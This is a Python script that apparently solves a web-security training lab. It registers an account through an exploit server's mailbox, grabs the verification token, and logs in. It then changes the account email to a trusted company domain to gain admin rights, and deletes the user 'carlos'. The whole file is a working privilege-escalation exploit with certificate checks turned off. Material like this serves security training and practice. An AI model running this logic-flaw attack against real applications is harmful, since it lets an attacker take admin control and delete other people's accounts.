import requests
import re


# Disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = "https://0af3007d0450e7e9818c5caf001b001f.web-security-academy.net"  #change to lab URL
email_client = "https://exploit-0ae300e804e5e7b8819e5b22013d007b.exploit-server.net"
username = "test"
password = "test"

def register(url,username,password,email_client):
    final_url = url+"/register"
    register_session = requests.session()
    r = register_session.get(final_url)
    match = re.search(r'name="csrf" value="(.+)">',r.text)
    register_csrf_token = match.group(1)
    print(f"login csrf token is {register_csrf_token}")
    email = email_client.replace("https://", "")
    register_data = {"csrf":register_csrf_token,"username":username,"password":password,"email":f"attacker@{email}"}
    r= register_session.post(final_url,verify=False,data=register_data)

def verify_account(url,email_client):
    final_email = email_client +"/email"
    r = requests.get(final_email,verify=False)
    match = re.search(r'temp-registration-token=(.+)\' target=_blank>',r.text)
    token = match.group(1)
    print(f"verfication token is {token}")
    verification_url = f"{url}?temp-registration-token={token}"
    r = requests.get(verification_url,verify=False)
    print("Account verified")

def login_delete(url,username,password):
    login_session = requests.session()
    login_url = url + "/login"
    r = login_session.get(login_url,verify=False)
    match = re.search(r'name="csrf" value="(.+)">',r.text)
    login_csrf_token = match.group(1)
    print(f"login csrf token is {login_csrf_token}")

    login_data = {"csrf":login_csrf_token,"username":username,"password":password}
    r = login_session.post(login_url,verify=False,data=login_data)
    print("login success")
    match = re.search(r'name="csrf" value="(.+)">',r.text)
    update_token = match.group(1)
    print(f"update csrf token is {update_token}")
    update_data = {"email":"lol@dontwannacry.com","csrf":update_token}
    r = login_session.post(url+"/my-account/change-email",verify=False,data=update_data)
    print("Email updated")
    r = login_session.get(url+"/admin/delete?username=carlos",verify=False)
    print("Carlos deleted")


register(url,username,password,email_client)
print("User registered")
verify_account(url,email_client)
login_delete(url,username,password)